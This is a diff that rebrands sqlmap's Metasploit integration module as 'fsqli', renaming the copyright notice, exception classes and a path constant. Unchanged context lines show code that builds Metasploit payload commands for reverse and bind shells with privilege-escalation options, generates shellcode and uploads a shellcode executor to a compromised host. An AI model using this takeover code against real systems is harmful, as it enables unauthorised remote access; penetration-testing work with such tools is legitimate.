@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2024 fsqli developers (https://fsqli.org/)
 See the file 'LICENSE' for copying permission
 """
 
@@ -38,9 +38,9 @@ from lib.core.data import logger
 from lib.core.data import paths
 from lib.core.enums import DBMS
 from lib.core.enums import OS
-from lib.core.exception import SqlmapDataException
-from lib.core.exception import SqlmapFilePathException
-from lib.core.exception import SqlmapGenericException
+from lib.core.exception import FsqliDataException
+from lib.core.exception import FsqliFilePathException
+from lib.core.exception import FsqliGenericException
 from lib.core.settings import IS_WIN
 from lib.core.settings import METASPLOIT_SESSION_TIMEOUT
 from lib.core.settings import SHELLCODEEXEC_RANDOM_STRING_MARKER
@@ -277,7 +277,7 @@ class Metasploit(object):
             return None
 
         else:
-            raise SqlmapDataException("unexpected connection type")
+            raise FsqliDataException("unexpected connection type")
 
     def _selectLhost(self):
         if self.connectionStr.startswith("reverse"):
@@ -293,7 +293,7 @@ class Metasploit(object):
             return None
 
         else:
-            raise SqlmapDataException("unexpected connection type")
+            raise FsqliDataException("unexpected connection type")
 
     def _selectConnection(self):
         return self._skeletonSelection("connection type", self._msfConnectionsList)
@@ -318,7 +318,7 @@ class Metasploit(object):
             elif self.connectionStr.startswith("reverse"):
                 self._cliCmd += " LHOST=%s" % self.lhostStr
             else:
-                raise SqlmapDataException("unexpected connection type")
+                raise FsqliDataException("unexpected connection type")
 
             if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
                 self._cliCmd += " DisableCourtesyShell=true"
@@ -334,7 +334,7 @@ class Metasploit(object):
             elif self.connectionStr.startswith("reverse"):
                 self._cliCmd += "; set LHOST %s" % self.lhostStr
             else:
-                raise SqlmapDataException("unexpected connection type")
+                raise FsqliDataException("unexpected connection type")
 
             if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
                 self._cliCmd += "; set DisableCourtesyShell true"
@@ -356,7 +356,7 @@ class Metasploit(object):
             elif self.connectionStr.startswith("reverse"):
                 self._cliCmd += " LHOST=%s" % self.lhostStr
             else:
-                raise SqlmapDataException("unexpected connection type")
+                raise FsqliDataException("unexpected connection type")
 
             self._cliCmd += " E"
         else:
@@ -371,7 +371,7 @@ class Metasploit(object):
             elif self.connectionStr.startswith("reverse"):
                 self._cliCmd += "; set LHOST %s" % self.lhostStr
             else:
-                raise SqlmapDataException("unexpected connection type")
+                raise FsqliDataException("unexpected connection type")
 
             self._cliCmd += "; exploit'"
 
@@ -388,7 +388,7 @@ class Metasploit(object):
         if self.connectionStr.startswith("reverse"):
             self._payloadCmd += " LHOST=%s" % self.lhostStr
         elif not self.connectionStr.startswith("bind"):
-            raise SqlmapDataException("unexpected connection type")
+            raise FsqliDataException("unexpected connection type")
 
         if Backend.isOs(OS.LINUX) and conf.privEsc:
             self._payloadCmd += " PrependChrootBreak=true PrependSetuid=true"
@@ -567,7 +567,7 @@ class Metasploit(object):
                         proc.kill()
                         errMsg = "timeout occurred while attempting "
                         errMsg += "to open a remote session"
-                        raise SqlmapGenericException(errMsg)
+                        raise FsqliGenericException(errMsg)
 
             except select.error as ex:
                 # Reference: https://github.com/andymccurdy/redis-py/pull/743/commits/2b59b25bb08ea09e98aede1b1f23a270fc085a9f
@@ -610,7 +610,7 @@ class Metasploit(object):
             logger.debug(debugMsg)
         else:
             errMsg = "failed to create the shellcode ('%s')" % getText(payloadStderr).replace("\n", " ").replace("\r", "")
-            raise SqlmapFilePathException(errMsg)
+            raise FsqliFilePathException(errMsg)
 
         self._shellcodeFP = open(self._shellcodeFilePath, "rb")
         self.shellcodeString = getText(self._shellcodeFP.read())
@@ -619,7 +619,7 @@ class Metasploit(object):
         os.unlink(self._shellcodeFilePath)
 
     def uploadShellcodeexec(self, web=False):
-        self.shellcodeexecLocal = os.path.join(paths.SQLMAP_EXTRAS_PATH, "shellcodeexec")
+        self.shellcodeexecLocal = os.path.join(paths.FSQLI_EXTRAS_PATH, "shellcodeexec")
 
         if Backend.isOs(OS.WINDOWS):
             self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "windows", "shellcodeexec.x%s.exe_" % "32")
